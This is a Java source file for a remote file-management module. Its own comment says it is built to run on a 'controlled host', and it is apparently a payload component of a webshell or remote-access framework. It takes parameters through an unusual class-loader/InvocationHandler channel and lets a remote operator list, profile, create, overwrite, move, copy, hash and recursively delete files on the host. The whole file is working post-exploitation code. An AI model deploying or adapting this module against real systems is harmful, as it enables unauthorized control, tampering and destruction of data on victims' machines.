package org.leo.core.component;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 文件操作组件，提供跨平台的文件和目录操作功能，设计为在被控主机上稳定执行。
 *
 */
public class FileComponent implements Runnable {

    private static final int MAX_DELETE_DEPTH = 50;
    private static final long MAX_WRITE_BYTES = 50L * 1024 * 1024;
    private static final int COPY_BUFFER_SIZE = 8192;

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        handleFile();
    }

    /**
     * 文件操作处理
     */
    private void handleFile() throws Exception {
        String action = getStringParam("action");
        if ("profile".equals(action)) getFileSystemProfile();
        else if ("list".equals(action)) getFileList();
        else if ("delete".equals(action)) deleteFile();
        else if ("createDirectory".equals(action)) createDirectory();
        else if ("createFile".equals(action)) createNewFile();
        else if ("move".equals(action)) moveFile();
        else if ("edit".equals(action)) editFile();
        else if ("copy".equals(action)) copyFile();
        else if ("checksum".equals(action)) getFileMD5();
        else throw new IllegalArgumentException("Invalid action: " + action);
    }

    private void getFileSystemProfile() {
        String osName = System.getProperty("os.name", "");
        boolean windows = osName.toLowerCase().contains("win");
        List roots = new ArrayList();
        File[] rootFiles = File.listRoots();
        if (rootFiles != null) {
            for (int i = 0; i < rootFiles.length; i++) {
                roots.add(rootFiles[i].getPath());
            }
        }
        Map capabilities = new HashMap();
        capabilities.put("posixMode", Boolean.valueOf(!windows));
        capabilities.put("windowsAttributes", Boolean.valueOf(windows));
        capabilities.put("transactionalUpload", Boolean.TRUE);
        capabilities.put("rangeRead", Boolean.TRUE);
        capabilities.put("checksum", Boolean.TRUE);

        results.put("code", Integer.valueOf(200));
        results.put("osFamily", windows ? "WINDOWS" : "POSIX");
        results.put("pathStyle", windows ? "WINDOWS" : "POSIX");
        results.put("separator", File.separator);
        results.put("caseSensitivity", windows ? "INSENSITIVE" : "SENSITIVE");
        results.put("roots", roots);
        results.put("capabilities", capabilities);
    }

    /**
     * 获取文件列表
     */
    private void getFileList() throws Exception {
        String path = getPathFromParams();

        File directory = new File(path);
        if (!directory.exists()) {
            results.put("code", 500);
            results.put("msg", "directory not found: " + path);
            return;
        }

        if (!directory.isDirectory()) {
            results.put("code", 500);
            results.put("msg", "not a directory: " + path);
            return;
        }

        List fileList = new ArrayList();
        File[] files = directory.listFiles();

        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                Map fileInfo = getFileInfoMap(files[i]);
                fileList.add(fileInfo);
            }
        }

        results.put("code", 200);
        results.put("fileList", fileList);
        results.put("absolutePath", directory.getAbsolutePath());
        results.put("count", Integer.valueOf(fileList.size()));
    }

    /**
     * 删除文件
     */
    private void deleteFile() throws Exception {
        String path = getPathFromParams();

        File file = new File(path);
        if (!file.exists()) {
            results.put("code", 500);
            results.put("msg", "file not found: " + path);
            return;
        }

        if (file.isDirectory()) {
            // 符号链接仅删除链接本身，不递归进入链接目标。
            if (isSymbolicLink(file)) {
                boolean success = file.delete();
                results.put("code", success ? 200 : 500);
                results.put("msg", success ? "symlink deleted: " + file.getName()
                        : "failed to delete symlink: " + file.getName());
                return;
            }

            List failedFiles = new ArrayList();
            boolean success = deleteDirectory(file, 0, failedFiles);

            if (success && failedFiles.isEmpty()) {
                results.put("code", 200);
                results.put("msg", "directory deleted: " + file.getName());
            } else {
                results.put("code", 500);
                results.put("msg", "delete partially failed: " + file.getName());
                if (!failedFiles.isEmpty()) {
                    results.put("failedFiles", failedFiles);
                    results.put("failedCount", Integer.valueOf(failedFiles.size()));
                }
            }
        } else {
            boolean success = file.delete();
            results.put("code", success ? 200 : 500);
            results.put("msg", success ? "deleted: " + file.getName()
                    : "failed to delete: " + file.getName());
        }
    }

    /**
     * 创建目录
     */
    private void createDirectory() throws Exception {
        String path = getPathFromParams();

        File directory = new File(path);
        if (directory.exists()) {
            results.put("code", 500);
            results.put("msg", "directory already exists: " + path);
            return;
        }

        if (directory.mkdirs()) {
            results.put("code", 200);
            results.put("msg", "directory created: " + path);
            results.put("absolutePath", directory.getAbsolutePath());
        } else {
            results.put("code", 500);
            results.put("msg", "failed to create directory: " + path);
        }
    }

    /**
     * 创建新文件
     * 支持可选 content 参数。
     */
    private void createNewFile() throws Exception {
        String path = getPathFromParams();
        byte[] content = (byte[]) params.get("content");
        if (content != null && content.length > MAX_WRITE_BYTES) {
            results.put("code", 500);
            results.put("msg", "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
            return;
        }

        File file = new File(path);
        if (file.exists()) {
            results.put("code", 500);
            results.put("msg", "file already exists: " + path);
            return;
        }

        // 确保父目录存在
        File parent = file.getParentFile();
        if (parent != null && !parent.exists()) {
            if (!parent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create parent directory: " + parent.getAbsolutePath());
                return;
            }
        }

        if (!file.createNewFile()) {
            results.put("code", 500);
            results.put("msg", "failed to create file: " + path);
            return;
        }

        // 如果 params 包含 content，写入初始内容
        if (content != null && content.length > 0) {
            FileOutputStream fos = null;
            try {
                fos = new FileOutputStream(file);
                fos.write(content);
                fos.flush();
            } finally {
                closeResource(fos);
            }
        }

        results.put("code", 200);
        results.put("msg", "file created: " + path);
        results.put("absolutePath", file.getAbsolutePath());
        if (content != null) {
            results.put("size", Integer.valueOf(content.length));
        }
    }

    /** 移动文件，overwrite 时以同目录备份保证失败可回滚。 */
    private void moveFile() throws Exception {
        String sourcePath = getPathFromParams();
        String newPath = getStringParam("newPath");
        String strategy = getStringParam("conflictStrategy");
        validateConflictStrategy(strategy);

        File sourceFile = new File(sourcePath);
        File destFile = new File(newPath);

        if (!sourceFile.exists()) {
            results.put("code", 500);
            results.put("msg", "source not found: " + sourcePath);
            return;
        }

        // 冲突解析
        File resolved = resolveConflict(destFile, strategy);
        if (resolved == null) {
            // skip
            results.put("code", 200);
            results.put("msg", "skipped: target exists: " + destFile.getAbsolutePath());
            results.put("skipped", Boolean.TRUE);
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }
        destFile = resolved;

        // 确保目标目录存在
        File destParent = destFile.getParentFile();
        if (destParent != null && !destParent.exists()) {
            if (!destParent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create target directory: " + destParent.getAbsolutePath());
                return;
            }
        }

        File backupFile = null;
        if ("overwrite".equals(strategy) && destFile.exists()) {
            if (destFile.isDirectory()) {
                results.put("code", Integer.valueOf(500));
                results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath());
                return;
            }
            backupFile = createBackupFile(destFile);
            if (!destFile.renameTo(backupFile)) {
                results.put("code", Integer.valueOf(500));
                results.put("msg", "cannot prepare target backup: " + destFile.getAbsolutePath());
                return;
            }
        }

        if (sourceFile.renameTo(destFile)) {
            deleteBackup(backupFile);
            results.put("code", 200);
            results.put("msg", "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }

        if (!sourceFile.isFile()) {
            restoreBackup(destFile, backupFile);
            results.put("code", 500);
            results.put("msg", "move failed (cross-filesystem directory move not supported): "
                    + sourcePath + " -> " + destFile.getAbsolutePath());
            return;
        }

        try {
            long totalBytes = copyFileContent(sourceFile, destFile);
            destFile.setLastModified(sourceFile.lastModified());
            if (!sourceFile.delete()) {
                restoreBackup(destFile, backupFile);
                results.put("code", Integer.valueOf(500));
                results.put("msg", "move rollback: source delete failed: " + sourcePath);
                return;
            }
            deleteBackup(backupFile);
            results.put("code", 200);
            results.put("msg", "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
            results.put("newPath", destFile.getAbsolutePath());
            results.put("size", Long.valueOf(totalBytes));
        } catch (Exception error) {
            restoreBackup(destFile, backupFile);
            throw error;
        }
    }

    private File createBackupFile(File target) {
        File parent = target.getParentFile();
        String name = target.getName();
        for (int i = 0; i < 1000; i++) {
            File candidate = new File(parent,
                    name + ".leo-backup-" + System.currentTimeMillis() + "-" + i);
            if (!candidate.exists()) {
                return candidate;
            }
        }
        return new File(parent, name + ".leo-backup-" + System.nanoTime());
    }

    private void restoreBackup(File target, File backup) {
        if (backup == null || !backup.exists()) {
            if (target.exists()) {
                target.delete();
            }
            return;
        }
        if (target.exists() && !target.delete()) {
            throw new IllegalStateException("cannot remove incomplete target: " + target.getAbsolutePath());
        }
        if (!backup.renameTo(target)) {
            throw new IllegalStateException("cannot restore target backup: " + target.getAbsolutePath());
        }
    }

    private void deleteBackup(File backup) {
        if (backup != null && backup.exists() && !backup.delete()) {
            backup.deleteOnExit();
        }
    }

    /**
     * 编辑文件
     * 编辑文件。
     */
    private void editFile() throws Exception {
        String path = getPathFromParams();

        byte[] content = (byte[]) params.get("content");
        if (content == null) {
            results.put("code", 500);
            results.put("msg", "content is null");
            return;
        }

        if (content.length > MAX_WRITE_BYTES) {
            results.put("code", 500);
            results.put("msg", "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
            return;
        }

        File file = new File(path);

        // 确保父目录存在
        File parent = file.getParentFile();
        if (parent != null && !parent.exists()) {
            if (!parent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create parent directory: " + parent.getAbsolutePath());
                return;
            }
        }

        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
            fos.write(content);
            fos.flush();
        } finally {
            closeResource(fos);
        }

        results.put("code", 200);
        results.put("msg", "file edited: " + path);
        results.put("size", Integer.valueOf(content.length));
        results.put("absolutePath", file.getAbsolutePath());
    }

    /**
     * 获取文件MD5值
     */
    private void getFileMD5() throws Exception {
        String path = getPathFromParams();

        File file = new File(path);
        if (!file.exists()) {
            results.put("code", 500);
            results.put("msg", "file not found: " + path);
            return;
        }

        if (!file.isFile()) {
            results.put("code", 500);
            results.put("msg", "not a file: " + path);
            return;
        }

        String md5 = calculateFileMD5(file);
        results.put("code", 200);
        results.put("md5", md5);
        results.put("filePath", file.getAbsolutePath());
        results.put("fileSize", Long.valueOf(file.length()));
    }

    /**
     * 复制文件
     * 复制文件并保留最后修改时间。
     * 支持 conflictStrategy: overwrite / autorename / skip。
     */
    private void copyFile() throws Exception {
        String sourcePath = getPathFromParams();
        String destPath = getStringParam("destPath");
        String strategy = getStringParam("conflictStrategy");
        validateConflictStrategy(strategy);

        File sourceFile = new File(sourcePath);
        File destFile = new File(destPath);

        if (!sourceFile.exists()) {
            results.put("code", 500);
            results.put("msg", "source not found: " + sourcePath);
            return;
        }

        if (!sourceFile.isFile()) {
            results.put("code", 500);
            results.put("msg", "source is not a file: " + sourcePath);
            return;
        }

        // 冲突解析
        File resolved = resolveConflict(destFile, strategy);
        if (resolved == null) {
            // skip
            results.put("code", 200);
            results.put("msg", "skipped: target exists: " + destFile.getAbsolutePath());
            results.put("skipped", Boolean.TRUE);
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }
        destFile = resolved;

        // 确保目标目录存在
        File destParent = destFile.getParentFile();
        if (destParent != null && !destParent.exists()) {
            if (!destParent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create target directory: " + destParent.getAbsolutePath());
                return;
            }
        }

        File backupFile = null;
        if ("overwrite".equals(strategy) && destFile.exists()) {
            if (destFile.isDirectory()) {
                results.put("code", Integer.valueOf(500));
                results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath());
                return;
            }
            backupFile = createBackupFile(destFile);
            if (!destFile.renameTo(backupFile)) {
                results.put("code", Integer.valueOf(500));
                results.put("msg", "cannot prepare target backup: " + destFile.getAbsolutePath());
                return;
            }
        }

        try {
            long totalBytes = copyFileContent(sourceFile, destFile);
            destFile.setLastModified(sourceFile.lastModified());
            deleteBackup(backupFile);
            results.put("code", 200);
            results.put("msg", "copied: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
            results.put("newPath", destFile.getAbsolutePath());
            results.put("size", Long.valueOf(totalBytes));
        } catch (Exception error) {
            restoreBackup(destFile, backupFile);
            throw error;
        }
    }

    /**
     * 解析目标路径上的同名冲突。
     *
     * @param dest     原始目标
     * @param strategy overwrite / autorename / skip / null
     * @return 实际应使用的目标 File；返回 null 表示 skip
     */
    private File resolveConflict(File dest, String strategy) {
        if (dest == null || !dest.exists()) {
            return dest;
        }
        if ("overwrite".equals(strategy)) {
            return dest;
        }
        if ("skip".equals(strategy)) {
            return null;
        }
        if ("autorename".equals(strategy)) {
            return autoRename(dest);
        }
        throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
    }

    private void validateConflictStrategy(String strategy) {
        if (!"overwrite".equals(strategy)
                && !"autorename".equals(strategy)
                && !"skip".equals(strategy)) {
            throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
        }
    }

    /**
     * 在目标同目录下找一个不冲突的名字：foo.txt -> foo (1).txt -> foo (2).txt ...
     * 上限 1000 次，避免极端情况死循环。
     */
    private File autoRename(File dest) {
        File parent = dest.getParentFile();
        String name = dest.getName();
        String base;
        String ext;
        int dot = name.lastIndexOf('.');
        // 仅当点号不在开头才视为扩展名（避免 .bashrc 被切）
        if (dot > 0) {
            base = name.substring(0, dot);
            ext = name.substring(dot);
        } else {
            base = name;
            ext = "";
        }
        for (int i = 1; i <= 1000; i++) {
            File candidate = new File(parent, base + " (" + i + ")" + ext);
            if (!candidate.exists()) {
                return candidate;
            }
        }
        return new File(parent, base + " (" + System.currentTimeMillis() + ")" + ext);
    }

    // ==================== 辅助方法 ====================

    /**
     * 从参数中获取路径
     */
    private String getPathFromParams() throws Exception {
        return getStringParam("path");
    }

    /**
     * 获取字符串参数。传输层中的文本字段以 UTF-8 byte[] 到达远端组件。
     */
    private String getStringParam(String key) throws UnsupportedEncodingException {
        Object value = params.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof byte[]) {
            return new String((byte[]) value, "UTF-8");
        }
        return String.valueOf(value);
    }

    /**
     * 复制文件内容。
     */
    private long copyFileContent(File source, File dest) throws Exception {
        long totalBytes = 0;
        FileInputStream fis = null;
        FileOutputStream fos = null;
        try {
            fis = new FileInputStream(source);
            fos = new FileOutputStream(dest);
            byte[] buffer = new byte[COPY_BUFFER_SIZE];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            fos.flush();
        } finally {
            closeResource(fis);
            closeResource(fos);
        }
        return totalBytes;
    }

    /**
     * 获取文件信息映射
     */
    private Map getFileInfoMap(File file) {
        Map fileInfo = new HashMap();

        fileInfo.put("name", file.getName());
        fileInfo.put("path", file.getAbsolutePath());
        fileInfo.put("size", Long.valueOf(file.length()));
        fileInfo.put("modified", Long.valueOf(file.lastModified()));
        fileInfo.put("isDirectory", Boolean.valueOf(file.isDirectory()));
        fileInfo.put("isFile", Boolean.valueOf(file.isFile()));
        fileInfo.put("canRead", Boolean.valueOf(file.canRead()));
        fileInfo.put("canWrite", Boolean.valueOf(file.canWrite()));
        fileInfo.put("canExecute", Boolean.valueOf(canExecute(file)));
        fileInfo.put("exists", Boolean.valueOf(file.exists()));

        // 获取文件扩展名
        String fileName = file.getName();
        int lastDotIndex = fileName.lastIndexOf('.');
        if (lastDotIndex > 0) {
            fileInfo.put("extension", fileName.substring(lastDotIndex + 1));
        }
        return fileInfo;
    }

    /**
     * 检查文件是否可执行
     * 读取可执行权限。
     */
    private boolean canExecute(File file) {
        try {
            java.lang.reflect.Method method = File.class.getMethod("canExecute");
            Object result = method.invoke(file);
            return ((Boolean) result).booleanValue();
        } catch (NoSuchMethodException e) {
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 检测是否为符号链接。远端组件保持 Java 6 API 基线，因此通过
     * canonical path 与 absolute path 比较，不依赖 NIO。
     */
    private boolean isSymbolicLink(File file) {
        try {
            File parent = file.getParentFile();
            // 先对父目录做 canonical 解析，只比较当前文件名这一层
            File canonical;
            if (parent != null) {
                canonical = new File(parent.getCanonicalFile(), file.getName());
            } else {
                canonical = file;
            }
            return !canonical.getCanonicalPath().equals(canonical.getAbsolutePath());
        } catch (Exception e) {
            // 无法判断时保守认为不是
            return false;
        }
    }

    /**
     * 递归删除目录，带深度限制和失败收集。
     *
     * @param directory   要删除的目录
     * @param depth       当前递归深度
     * @param failedFiles 删除失败的文件路径列表（输出参数）
     * @return 目录本身是否删除成功
     */
    private boolean deleteDirectory(File directory, int depth, List failedFiles) {
        if (depth > MAX_DELETE_DEPTH) {
            failedFiles.add(directory.getAbsolutePath() + " (max depth exceeded)");
            return false;
        }

        if (!directory.exists()) {
            return true;
        }

        File[] files = directory.listFiles();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                File child = files[i];

                // 子项为符号链接时仅删除链接本身。
                if (child.isDirectory() && !isSymbolicLink(child)) {
                    deleteDirectory(child, depth + 1, failedFiles);
                } else {
                    if (!child.delete()) {
                        failedFiles.add(child.getAbsolutePath());
                    }
                }
            }
        }

        boolean deleted = directory.delete();
        if (!deleted) {
            failedFiles.add(directory.getAbsolutePath());
        }
        return deleted;
    }

    /**
     * 计算文件 MD5 值
     */
    private String calculateFileMD5(File file) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        FileInputStream fis = null;

        try {
            fis = new FileInputStream(file);
            byte[] buffer = new byte[COPY_BUFFER_SIZE];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                md.update(buffer, 0, bytesRead);
            }

            byte[] digest = md.digest();
            StringBuilder hexString = new StringBuilder();

            for (int i = 0; i < digest.length; i++) {
                String hex = Integer.toHexString(0xff & digest[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString();
        } finally {
            closeResource(fis);
        }
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception ignored) {
            }
        }
    }
}
